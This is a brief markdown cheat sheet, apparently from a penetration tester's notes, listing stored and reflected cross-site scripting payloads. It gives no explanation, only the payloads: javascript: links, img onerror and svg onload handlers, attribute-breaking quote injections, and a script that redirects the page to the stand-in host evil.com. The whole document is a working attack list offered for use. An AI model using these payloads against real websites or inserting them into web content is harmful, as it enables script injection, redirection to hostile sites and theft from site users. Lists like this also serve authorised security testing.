# Payload-xss

### stored
```
<a href="javascript:alert(1)">xss injection</a>
<a href='https://evil.com'>Html injection</a>
<script>window.location.href="https://evil.com"</script>
"><img src=x onerror=alert(document.domain)>
'onmouseover="alert(1)

```

### reflected

```
javascript:alert(document.domain);
"><img src=x onerror=alert(document.domain)>
</script><svg onload=confirm(location)>
```
